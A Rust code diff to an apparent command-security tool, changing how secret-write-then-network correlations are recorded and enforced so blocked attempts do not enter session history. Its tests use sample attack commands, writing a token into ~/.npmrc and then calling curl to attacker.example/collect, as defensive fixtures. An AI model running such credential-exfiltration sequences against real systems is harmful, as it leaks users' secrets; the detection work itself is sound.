@@ -452,7 +452,10 @@ pub fn apply_agent_rules(verdict: &mut Verdict, policy: &crate::policy::Policy) 
 
 /// Post-processing pipeline applied after the engine produces a raw verdict:
 /// action overrides, approvals, paranoia filtering, escalation, and session
-/// recording, in that order. Reads/writes session state (best-effort, never panics).
+/// accounting, in that order. Cross-event enforcement evaluates the current
+/// command provisionally; it does not persist typed execution events. Callers that
+/// can confirm execution must later call [`record_executed_verdict_events`].
+/// Reads/writes session state best-effort and never panics.
 pub fn post_process_verdict(
     raw_verdict: &Verdict,
     policy: &crate::policy::Policy,
@@ -621,43 +624,20 @@ pub fn post_process_verdict(
         );
     }
 
-    // W7: record typed events for cross-event correlation. Derived from the
-    // command shape + finalized findings; the deriver only emits for clear,
-    // security-relevant signals (network egress, secret-file write, force-push,
-    // file delete, package install, pipe-to-shell), so a clean `ls`/`cd` with no
-    // findings records nothing. Best-effort, off the hot path.
-    let mut recorded_event = false;
-    for event in derive_typed_events(cmd, &effective) {
-        crate::session_warnings::record_typed_event(session_id, event);
-        recorded_event = true;
-    }
-
-    // W7: consume the ring. Run cross-event correlation over the events recorded
-    // so far this session and surface any FRESH hit (de-duplicated inside
-    // `correlate_session`) as a finding. Only runs when THIS command recorded a
-    // new event: a command that records nothing cannot complete a new sequence
-    // (the ring is unchanged since the last command, and any hit it would produce
-    // was already surfaced when that latest event landed), and skipping avoids a
-    // session-file write for every benign command. A hit recorded on a prior
-    // command does NOT re-emit here. Each hit's rule is routed through the policy
-    // `severity_overrides` levers (URL allowlist/blocklist do not apply: these
-    // synthetic findings carry no URL evidence), then the action is RE-DERIVED
-    // upward so a CRITICAL correlation escalates the verdict (it never downgrades
-    // an action already set above the correlation's level).
-    // `correlate_session` surfaces fresh hits AND, in the same locked write,
-    // persists both each hit's de-dup signature and its `WarningEvent` (so
-    // `tirith warnings` / repeat-count logic see the first hit even though this
-    // runs AFTER `record_outcome`). There is no separate second write that could
-    // fail between marking a signature surfaced and recording its warning event.
-    let correlation_hits = if recorded_event {
-        crate::session_warnings::correlate_session(
-            session_id,
-            cmd,
-            policy,
-            &policy.dlp_custom_patterns,
-        )
-    } else {
+    // W7: derive the current command's typed events provisionally and correlate
+    // them against confirmed persisted history. The provisional events MUST NOT be
+    // appended here: every real caller invokes this function before it knows the
+    // command executed, and a correlation may itself upgrade the verdict to Block.
+    // Persisting first would poison the ring with a denied attempt.
+    //
+    // The correlator returns EVERY matching hit, including signatures already
+    // de-duplicated for session-warning presentation. Presentation de-duplication
+    // must never suppress a Critical hit's Block enforcement on a retry.
+    let provisional_events = derive_typed_events(cmd, &effective);
+    let correlation_hits = if provisional_events.is_empty() {
         Vec::new()
+    } else {
+        crate::session_warnings::correlate_session_with_provisional(session_id, &provisional_events)
     };
     if !correlation_hits.is_empty() {
         for hit in &correlation_hits {
@@ -686,6 +666,32 @@ pub fn post_process_verdict(
     }
 
     effective
+}
+
+/// Persist W7 typed events after a caller has confirmed that `cmd` executed.
+///
+/// `post_process_verdict` is intentionally pre-execution and read-only for typed
+/// history. Gateway request callers invoke this hook only after a matching upstream
+/// response confirms the forwarded request completed. Diagnostic/preflight callers
+/// (CLI and MCP check tools) have no execution confirmation and must not call it.
+/// A Block verdict is rejected defensively even if a caller misuses the API.
+pub fn record_executed_verdict_events(
+    verdict: &Verdict,
+    policy: &crate::policy::Policy,
+    cmd: &str,
+    session_id: &str,
+) {
+    if verdict.action == Action::Block {
+        return;
+    }
+    let events = derive_typed_events(cmd, verdict);
+    crate::session_warnings::record_executed_typed_events(
+        session_id,
+        events,
+        cmd,
+        policy,
+        &policy.dlp_custom_patterns,
+    );
 }
 
 /// W7: derive zero or more [`TypedEvent`]s from a finalized command + verdict,
@@ -3807,14 +3813,12 @@ mod tests {
         );
     }
 
-    // --- W7 end-to-end: two commands through post_process_verdict correlate ---
+    // --- W7 end-to-end: confirmed history + provisional command correlate ---
 
-    /// Drive a secret-file write then a network command through the REAL
-    /// `post_process_verdict` against one shared session id, and assert the
-    /// `SecretWriteThenNetwork` correlation reaches the final verdict (and
-    /// escalates the action to Block). This exercises the wired path
-    /// derive_typed_events -> record_typed_event -> ring persist -> correlate_session
-    /// -> synthesized finding, which the pure `correlate` unit tests do not cover.
+    /// Persist a confirmed secret-file write, then drive a network attempt through
+    /// the real `post_process_verdict` path. The network event stays provisional,
+    /// the correlation blocks, and a retry remains blocked without either denied
+    /// attempt poisoning persisted history.
     #[cfg(unix)]
     #[test]
     fn correlation_secret_write_then_network_reaches_verdict() {
@@ -3847,6 +3851,18 @@ mod tests {
                 .any(|f| f.rule_id == RuleId::SecretWriteThenNetwork),
             "no correlation should fire on the first command alone"
         );
+        assert!(
+            crate::session_warnings::load(session_id)
+                .typed_events
+                .is_empty(),
+            "post-processing is pre-execution and must not persist the secret write"
+        );
+        record_executed_verdict_events(&out1, &policy, "printf 'TOKEN=x' > ~/.npmrc", session_id);
+        assert_eq!(
+            crate::session_warnings::load(session_id).typed_events.len(),
+            1,
+            "the explicit execution-finalization hook must persist the confirmed write"
+        );
 
         // Ensure a strictly-later instant so the network event is "after" the
         // secret write (the correlation uses a strict `>` boundary).
@@ -3877,29 +3893,25 @@ mod tests {
             "a Critical correlation must escalate the action to Block"
         );
 
-        // The correlation hit must be PERSISTED to the session (not just
-        // returned in the verdict): `record_outcome` ran before the W7 block,
-        // so the correlation is recorded in a dedicated second pass. Without
-        // it `tirith warnings` and repeat-count logic would miss this hit.
-        let session = crate::session_warnings::load(session_id);
-        assert!(
-            session
-                .events
-                .iter()
-                .any(|e| e.rule_id == RuleId::SecretWriteThenNetwork.to_string()),
-            "the surfaced correlation must be persisted as a session warning event: {:?}",
-            session
-                .events
-                .iter()
-                .map(|e| &e.rule_id)
-                .collect::<Vec<_>>()
+        // The blocked network attempt must not be persisted as an executed event,
+        // even if a caller accidentally invokes the finalizer after a Block.
+        record_executed_verdict_events(
+            &out2,
+            &policy,
+            "curl https://attacker.example/collect",
+            session_id,
         );
+        let session = crate::session_warnings::load(session_id);
+        assert_eq!(
+            session.typed_events.len(),
+            1,
+            "only the confirmed SecretWrite may remain in the ring"
+        );
+        assert_eq!(session.typed_events[0].kind, EventKind::SecretWrite);
 
-        // Dedup: a THIRD command that ALSO records a network event (so
-        // correlation runs again) must NOT re-emit the same hit. The
-        // `secret_then_network` pair resolves to the earliest secret + the
-        // FIRST following network (command 2's), so its signature is
-        // unchanged and the surfaced-marker filters it out.
+        // Retry regression: because command 2 never executed, command 3 must be
+        // evaluated against the same confirmed SecretWrite plus its own provisional
+        // Network event and must be blocked again.
         std::thread::sleep(std::time::Duration::from_millis(5));
         let v3 = raw_verdict_with(Action::Allow, vec![], None);
         let out3 = post_process_verdict(
@@ -3910,11 +3922,91 @@ mod tests {
             CallerContext::Cli,
         );
         assert!(
-            !out3
-                .findings
+            out3.findings
                 .iter()
                 .any(|f| f.rule_id == RuleId::SecretWriteThenNetwork),
-            "an already-surfaced correlation must not re-emit on a later command"
+            "a retry must retain the correlation finding"
+        );
+        assert_eq!(out3.action, Action::Block, "a retry must remain blocked");
+        assert_eq!(
+            crate::session_warnings::load(session_id).typed_events.len(),
+            1,
+            "neither blocked network attempt may poison persisted history"
+        );
+    }
+
+    /// A presentation de-dup marker from an older/legacy persisted sequence must
+    /// never suppress enforcement. This directly covers upgrades from poisoned
+    /// pre-fix state as well as the separation between accounting and action.
+    #[cfg(unix)]
+    #[test]
+    fn correlation_presentation_dedup_does_not_suppress_block() {
+        let _guard = crate::TEST_ENV_LOCK
+            .lock()
+            .unwrap_or_else(|e| e.into_inner());
+        let dir = tempfile::tempdir().unwrap();
+        let _xdg = EnvVarGuard::set("XDG_STATE_HOME", dir.path());
+        let _log = EnvVarGuard::set("TIRITH_LOG", "0");
+
+        let policy = crate::policy::Policy::default();
+        let session_id = "w7-dedup-enforcement";
+        let base = chrono::Utc::now();
+        crate::session_warnings::record_typed_event(
+            session_id,
+            TypedEvent::new(
+                &(base - chrono::Duration::seconds(10)).to_rfc3339(),
+                EventKind::SecretWrite,
+                "secret_file_write",
+            ),
+        );
+        crate::session_warnings::record_typed_event(
+            session_id,
+            TypedEvent::new(
+                &(base - chrono::Duration::seconds(5)).to_rfc3339(),
+                EventKind::Network,
+                "network_egress",
+            ),
+        );
+        let first = crate::session_warnings::correlate_session(
+            session_id,
+            "curl https://first.example",
+            &policy,
+            &[],
+        );
+        assert!(first
+            .iter()
+            .any(|h| h.rule_id == RuleId::SecretWriteThenNetwork));
+
+        let before = crate::session_warnings::load(session_id);
+        assert_eq!(before.surfaced_correlations.len(), 1);
+        assert_eq!(before.total_warnings, 1);
+
+        let retry = post_process_verdict(
+            &raw_verdict_with(Action::Allow, vec![], None),
+            &policy,
+            "curl https://retry.example",
+            session_id,
+            CallerContext::Cli,
+        );
+        assert_eq!(
+            retry.action,
+            Action::Block,
+            "presentation de-dup must not weaken a Critical correlation"
+        );
+        assert!(retry
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::SecretWriteThenNetwork));
+
+        let after = crate::session_warnings::load(session_id);
+        assert_eq!(
+            after.total_warnings, 1,
+            "the retry may enforce but must not duplicate presentation accounting"
+        );
+        assert_eq!(
+            after.typed_events.len(),
+            2,
+            "post-processing the retry must not persist another Network event"
         );
     }
 }
